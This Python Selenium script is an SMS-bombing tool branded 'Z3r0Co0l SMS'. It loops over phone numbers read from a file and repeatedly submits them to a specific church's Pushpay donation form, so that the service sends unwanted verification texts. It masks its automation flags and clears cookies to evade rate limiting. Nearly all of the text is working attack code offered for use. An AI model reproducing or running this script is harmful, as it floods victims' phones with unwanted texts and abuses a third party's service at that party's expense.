# coding=utf-8

import os
import time
import warnings
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from colorama import Fore, Style

warnings.filterwarnings("ignore")

VALID_COUNTRIES = ["AU", "BE", "CA", "CH", "DE", "DK", "FI", "UK", "GT", "IS", "LV", "MX", "NO", "NZ", "PR", "SE", "SG", "US", "ZA"]

def banner():
    print(f'''
        {Fore.GREEN} ______ ____   _____    ___     _____  ___    ___   _      {Style.RESET_ALL}
        {Fore.GREEN}|___  /|___ \ |  __ \  / _ \   / ____|/ _ \  / _ \ | |     {Style.RESET_ALL}
        {Fore.GREEN}   / /   __) || |__) || | | | | |    | | | || | | || |     {Style.RESET_ALL}
        {Fore.GREEN}  / /   |__ < |  _  / | | | | | |    | | | || | | || |     {Style.RESET_ALL}
        {Fore.GREEN} / /__  ___) || | \ \ | |_| | | |____| |_| || |_| || |____ {Style.RESET_ALL}
        {Fore.GREEN}/_____||____/ |_|  \_\ \___/   \_____|\___/  \___/ |______|{Style.RESET_ALL}

                            {Fore.RED}    SMS {Style.RESET_ALL}
                        {Fore.GREEN}https://t.me/Z3r0Co0l{Style.RESET_ALL}
                {Fore.GREEN}https://www.facebook.com/zro.cool.5{Style.RESET_ALL}

''')
def get_driver_options():
    options = webdriver.ChromeOptions()
    options.add_argument("disable-infobars")
    options.add_argument("--disable-extensions")
    options.add_argument("--log-level=3")
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_argument("--silent")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--incognito")
    return options

def get_country_selection(country):
    if country in VALID_COUNTRIES:
        return country
    else:
        print(f"{Fore.RED}Invalid Country! Please choose a valid one from the list: {VALID_COUNTRIES}{Style.RESET_ALL}")
        exit(1)

def login(driver, d, x):
    driver.get('https://pushpay.com/g/christchurchofthevalley?r=fortnightly&fbclid=IwAR1qKkfKZXXS3EPSUwpB4gI3t6eJzmejmVEbzizWNxRUNit8tJ8MT9RRoME')
    time.sleep(1)
    WebDriverWait(driver,10).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div[1]/div/main/div[2]/div/div/div/form/div[1]/div/header/div/div[1]/input'))).send_keys("100")
    WebDriverWait(driver,10).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div/div/main/div[2]/div/div/div/form/div[1]/div/div/div[3]/div/div/select'))).send_keys("Peoria General Fund")
    WebDriverWait(driver,10).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div/div/main/div[2]/div/div/div/form/div[2]/button'))).click()
    WebDriverWait(driver,10).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div/div/main/div/div/div/div/form/div[2]/div/div/div/div[1]/div/div[2]/input'))).send_keys(x)
    WebDriverWait(driver,10).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div/div/main/div/div/div/div/form/div[2]/div/div/div/div[1]/div/div[1]/div/select'))).send_keys(d)
    WebDriverWait(driver,10).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div/div/main/div/div/div/div/form/div[3]/button'))).click()
    print(f"{Fore.GREEN} [+] Send SMS to {Style.RESET_ALL} {x}")
    driver.delete_all_cookies()

def main():
    os.system('cls')
    banner()
    print(f"{Fore.YELLOW} {', '.join(VALID_COUNTRIES)} {Style.RESET_ALL}")

    d = input(f"{Fore.GREEN} Select your Country: {Style.RESET_ALL}")
    country = get_country_selection(d)
    number = int(input(f"{Fore.GREEN} Enter The number of repetitions: {Style.RESET_ALL}"))

    driver = webdriver.Chrome(options=get_driver_options())

    with open('numbers.txt', 'r') as use:
        numbers = use.read().splitlines()

    for x in numbers: 
        for _ in range(number):
            try:
                login(driver, country, x)
            except Exception as e:
                print(f"{Fore.RED} Error occurred: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
